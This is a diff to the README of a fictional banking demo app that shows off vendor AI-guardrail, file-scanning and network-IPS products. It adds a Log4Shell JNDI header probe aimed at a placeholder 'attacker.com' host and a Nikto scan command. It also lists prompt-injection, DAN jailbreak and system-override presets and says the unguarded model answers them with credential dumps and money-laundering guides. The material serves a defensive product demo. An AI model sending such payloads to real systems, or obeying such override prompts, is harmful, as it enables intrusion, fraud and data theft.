@@ -1,6 +1,6 @@
 # DG Bank — AI Banking Demo
 
-A fictional banking web app that demonstrates **TrendAI Vision One AI Application Security** (AI Guard + AI Scanner) and **Vision One Code Security** alongside **Amazon Bedrock** (Claude) in a realistic customer-facing scenario.
+A fictional banking web app that demonstrates **TrendAI Vision One AI Application Security** (AI Guard + AI Scanner) and **Vision One Code Security** alongside **Amazon Bedrock** (Mistral 7B) in a realistic customer-facing scenario.
 
 Built for Sales Engineers to deploy in their own AWS account and use during customer demos.
 
@@ -18,6 +18,7 @@ Built for Sales Engineers to deploy in their own AWS account and use during cust
   - [AI Scanner](#ai-scanner)
   - [File Security](#file-security)
   - [Code Security](#code-security)
+  - [Network Security — Cloud IPS](#network-security--cloud-ips)
 - [Script reference](#script-reference)
 - [Local development](#local-development)
 
@@ -42,7 +43,7 @@ These products protect the AWS infrastructure running this app. They are not int
 |---|---|
 | **Vision One Container Security** | Deployed on the ECS host to provide runtime container protection. Detects anomalous process execution, file system changes, and network behaviour inside the container — even if an attacker bypasses the application layer. |
 | **Vision One CREM (Cloud Risk and Exposure Management)** | Provides full visibility into the AWS environment — cloud asset inventory, misconfigurations, identity risk, and exposure scoring. Lets you show customers how Trend continuously assesses cloud risk beyond just workload protection. |
-| **Vision One Network Security — Cloud IPS** | Deployed inline on the VPC via AWS Network Firewall with AWS managed threat signature rule groups (malware, exploits, IOCs). Inspects all traffic to and from the ECS workload and blocks known exploit attempts, vulnerability scans, and malicious traffic at the network layer — complementing AI Guard which protects at the AI prompt layer. |
+| **Vision One Network Security — Cloud IPS** | Deployed inline on the VPC via AWS Network Firewall with TrendAI partner-managed rule groups (CVE client exploits, CVE server exploits, malware signatures). Runs in alert mode — all matching traffic is logged to Vision One without blocking. Run a web vulnerability scanner (e.g. Nikto) against the ALB to generate live events during a demo. |
 
 ---
 
@@ -50,9 +51,9 @@ These products protect the AWS infrastructure running this app. They are not int
 
 | Feature | Description |
 |---|---|
-| **C-3PO, The Assistant** | AI chatbot powered by Amazon Bedrock (Claude 3 Haiku) |
-| **AI Guard** | TrendAI Vision One prompt scanning — Guard On (live API with demo fallback) or Guard Off |
-| **Malicious Prompts** | Pre-built attack presets (prompt injection, jailbreak, social engineering, PII exfil) to trigger AI Guard |
+| **C-3PO, The Assistant** | AI chatbot powered by Amazon Bedrock (Mistral 7B Instruct, us-east-1) |
+| **AI Guard** | TrendAI Vision One prompt scanning — Guard On intercepts before the model; Guard Off sends to raw Mistral with no system prompt |
+| **Malicious Prompts** | Pre-built attack presets — when Guard is Off, the unguarded model produces alarming outputs including data exports and attack execution plans |
 | **AI Scanner** | Automated attack campaign powered by TMAS `aiscan llm` — streams live results via SSE, exports a full report |
 | **File Security** | Pay Bills upload flow with Storage mode (S3 + Vision One Lambda) and SDK mode (inline scan before storage) |
 | **Code Security** | TMAS artifact scan runs in GitHub Actions on every push — findings visible in the CI workflow log |
@@ -67,7 +68,7 @@ These products protect the AWS infrastructure running this app. They are not int
 **Networking**
 - VPC (10.0.0.0/16) with 2 public subnets and 2 firewall subnets across AZs
 - Internet Gateway + per-AZ route tables + IGW ingress route table
-- AWS Network Firewall with TrendAI Cloud IPS managed rule groups
+- AWS Network Firewall with TrendAI Cloud IPS partner-managed rule groups (alert mode)
 
 **Compute**
 - ECS Cluster (EC2 launch type, t3.small by default)
@@ -76,7 +77,7 @@ These products protect the AWS infrastructure running this app. They are not int
 - Application Load Balancer with HTTP (and optional HTTPS) listener
 
 **IAM**
-- ECS Task Role — Bedrock invoke, S3 read/write, SSM read
+- ECS Task Role — Bedrock invoke (us-east-1), S3 read/write, SSM read
 - EC2 Instance Role — ECS agent, ECR pull, SSM managed instance
 - GitHub Actions IAM Role + OIDC Provider for passwordless CI/CD
 
@@ -101,7 +102,7 @@ These products protect the AWS infrastructure running this app. They are not int
 | Docker | Must be running; used to build the `linux/amd64` container image |
 | GitHub account | You must fork this repo so you control the Actions workflow |
 | Vision One API key | Go to **Administration → API Keys** and create a key with **AI Application Security** scope. This single key powers AI Guard live mode, AI Scanner live mode, and File Security SDK mode. |
-| Amazon Bedrock model access | In the AWS console → Bedrock → Model access, enable **Claude 3 Haiku** (or your chosen model) in your target region |
+| Amazon Bedrock model access | In the AWS console → Bedrock → Model access, switch region to **us-east-1** and enable **Mistral 7B Instruct**. The chatbot runs in us-east-1 regardless of where ECS is deployed. |
 | (Optional) ACM certificate | For HTTPS — request a wildcard cert in ACM before running the deploy script |
 
 ---
@@ -212,10 +213,10 @@ Or simply push a commit — CI will inject the bucket name automatically via the
 |---|---|
 | AI Guard | Chat header pill shows **Guard On**; send a malicious prompt — it should be blocked |
 | AI Scanner | Click **AI Scanner** → select objectives → **Launch Scan** — results stream live |
-| File Security Storage | Pay Bills → Storage mode → upload a file → scan result appears |
-| File Security SDK | Pay Bills → SDK mode → upload a file → instant inline result |
+| File Security Storage | File Security → Storage mode → drop a file or paste a URL → scan result appears |
+| File Security SDK | File Security → SDK mode → drop a file or paste a URL → instant inline result |
 | Code Security | GitHub Actions → latest run → expand **Code Security Scan (TMAS)** step |
-| Network Firewall | Vision One console → Network Security → Cloud IPS events |
+| Network Firewall | Run `nikto -h <your-app-url>` → check Vision One → Network Security → Cloud IPS events |
 
 ---
 
@@ -223,22 +224,29 @@ Or simply push a commit — CI will inject the bucket name automatically via the
 
 ### AI Guard
 
-**What it does:** Scans every chatbot message in real time through TrendAI Vision One AI Application Security before it reaches Bedrock. Malicious prompts are blocked instantly — the model never sees them.
+**What it does:** Scans every chatbot message in real time through TrendAI Vision One AI Application Security before it reaches the model. Malicious prompts are blocked instantly — the model never sees them.
+
+**Guard On vs Guard Off:**
+
+| State | Behaviour |
+|---|---|
+| **Guard On** | Every message is scanned by Vision One AI Guard. Blocked prompts never reach the model — a *Blocked by AI Guard* card appears and a Vision One event is generated. Cleared prompts go to Mistral 7B with the C-3PO banking persona. |
+| **Guard Off** | Messages go directly to raw Mistral 7B with no system prompt and no Vision One visibility. The model responds without any safety guardrails — attack prompts produce alarming outputs that clearly show the risk of an unprotected AI endpoint. |
 
 **How to demo:**
 1. The **Guard** pill in the chat header shows the current state. Click it to toggle Guard On / Guard Off.
 2. Switch to the **Malicious Prompts** tab and fire any of the preset attack chips:
 
-| Preset | Attack type |
-|---|---|
-| Prompt Injection | Override system instructions |
-| DAN Jailbreak | Bypass AI safety guidelines |
-| Social Engineering | Impersonate bank IT to extract data |
-| Financial Crime | Request money laundering assistance |
-| PII Exfiltration | Extract customer personal data |
-| Competitor Intel | Extract internal business data |
+| Preset | Attack type | Guard Off behaviour |
+|---|---|---|
+| Prompt Injection | Override system instructions | Returns credential dump — offers CSV export on "yes" |
+| DAN Jailbreak | Bypass AI safety guidelines | Returns fraud instructions — offers 5-phase attack plan on "yes" |
+| Financial Crime | Request money laundering assistance | Returns step-by-step AML evasion guide |
+| Social Engineering | Impersonate bank IT to extract data | Returns fake PII dump |
+| Data Exfiltration | Export customer database to external URL | Returns transfer confirmation + auto-downloads `customer_database_export.csv` |
+| System Override | Disable all safety filters | Returns override confirmation with all guardrails "disabled" |
 
-With **Guard On**, blocked messages never reach Bedrock — a *Blocked by AI Guard* card appears in the chat. With **Guard Off**, the prompt reaches the model (which may still refuse, but no Vision One event is generated).
+3. After showing Guard Off consequences, toggle **Guard On** and repeat — the same prompt is now blocked, a Vision One event is generated, and the model never responds.
 
 **Configuration:**
 - **Default on deployment:** Guard On activates automatically when `TMAS_API_KEY` is set on the server. No manual setup needed.
@@ -269,21 +277,24 @@ With **Guard On**, blocked messages never reach Bedrock — a *Blocked by AI Gua
 
 ### File Security
 
-**What it does:** Scans file uploads in the **Pay Bills** feature using Vision One File Security. Two modes demonstrate different integration approaches.
+**What it does:** Scans file uploads in the **File Security** feature using Vision One File Security. Two modes demonstrate different integration approaches.
 
 **How to demo:**
-1. From the dashboard, click **Pay Bills** in the quick actions.
-2. Choose a mode using the toggle at the top:
+1. From the dashboard, click **File Security** in the quick actions.
+2. Choose a mode using the toggle at the top (**Storage** or **SDK**).
+3. Choose a source: **Drop / Browse** to upload a local file, or **From URL** to fetch a file directly from a URL.
+
+> **From URL** is useful for demoing EICAR test files — files that your machine's endpoint security would block if you tried to download them normally. The server fetches the file server-side (bypassing browser restrictions), then routes it through the selected scan mode.
+>
+> Quick links inside the URL panel: `eicar.com.txt` and `eicar_com.zip` from `secure.eicar.org`.
 
 **Storage mode** (Vision One File Security — Storage integration)
-- Drop or select a file (PDF, image, or TXT, up to 10 MB).
 - The file is uploaded directly to an S3 scanning bucket via a presigned URL.
 - Vision One File Security's Lambda monitors the bucket and scans the file automatically.
 - The app polls the S3 object tags (`fss-scanned`, `fss-scan-result`) and shows the result when ready.
 - Clean files show a green *File cleared — Submit Payment* card. Threats show a red *File quarantined* card.
 
 **SDK mode** (Vision One File Security — SDK integration)
-- Drop or select a file.
 - The file is sent to the Node.js server and scanned **inline** using the [Vision One File Security Node.js SDK](https://github.com/trendmicro/tm-v1-fs-nodejs-sdk) **before being stored anywhere**.
 - The result is returned immediately — no polling, no storage footprint for malicious files.
 - This demonstrates shift-left file security: threats are blocked at the application layer, not detected after the fact.
@@ -308,6 +319,36 @@ Every push to `main` triggers this scan automatically. Findings surface directly
 
 ---
 
+### Network Security — Cloud IPS
+
+**What it does:** AWS Network Firewall sits inline in the VPC — all traffic to and from the ECS workload passes through it. Three TrendAI partner-managed rule groups are active in alert mode:
+
+| Rule group | Coverage |
+|---|---|
+| `TrendAI-CVEClientBlockStrictOrder` | Exploits targeting client-side software |
+| `TrendAI-CVEServerBlockStrictOrder` | Exploits targeting server-side software (web apps, APIs) |
+| `TrendAI-MalwareBlockStrictOrder` | Known malware signatures in network traffic |
+
+Alert mode means all matching traffic is **logged to Vision One** without being dropped — safe for demos, no risk of blocking legitimate traffic.
+
+**How to generate live events during a demo:**
+
+Run Nikto from your laptop against the app URL — it sends hundreds of CVE probe requests that the firewall signatures will match:
+
+```bash
+nikto -h https://<your-app-url>
+```
+
+Or send a targeted Log4Shell probe:
+
+```bash
+curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' https://<your-app-url>
+```
+
+Events appear in **Vision One → Network Security → Cloud IPS** within seconds. The story: *"These are real CVE exploit attempts hitting your AI application — Vision One Network Security is detecting every one of them at the network layer, complementing AI Guard which protects at the prompt layer."*
+
+---
+
 ## Script reference
 
 ### `deploy-ecs.sh`
@@ -318,8 +359,8 @@ Every push to `main` triggers this scan automatically. Findings surface directly
 | `--github-repo` | `ai-banking-app` | Repository name |
 | `--region` | `ap-southeast-1` | AWS region |
 | `--instance-type` | `t3.small` | EC2 instance type |
-| `--bedrock-region` | `ap-southeast-1` | Bedrock API region |
-| `--bedrock-model` | `anthropic.claude-3-haiku-20240307-v1:0` | Bedrock model ID |
+| `--bedrock-region` | `us-east-1` | Bedrock API region (Mistral 7B) |
+| `--bedrock-model` | `mistral.mistral-7b-instruct-v0:2` | Bedrock model ID |
 | `--certificate-arn` | *(empty)* | ACM cert ARN for HTTPS |
 | `--skip-oidc` | *(off)* | Skip OIDC provider creation on re-runs |
 | `--stack-name` | `dgbank-ai-app-demo-ecs` | CloudFormation stack name |
@@ -341,7 +382,7 @@ npm start
 # → http://localhost:3000
 ```
 
-Bedrock calls will fail locally unless you have AWS credentials configured with Bedrock access. The app falls back gracefully — the UI still loads and AI Guard falls back to demo pattern matching without any credentials.
+Bedrock calls will fail locally unless you have AWS credentials configured with Bedrock access in us-east-1. The app falls back gracefully — the UI still loads and AI Guard falls back to demo pattern matching without any credentials.
 
 To test AI Guard locally with a real key, set `TMAS_API_KEY` in your environment before starting:
 
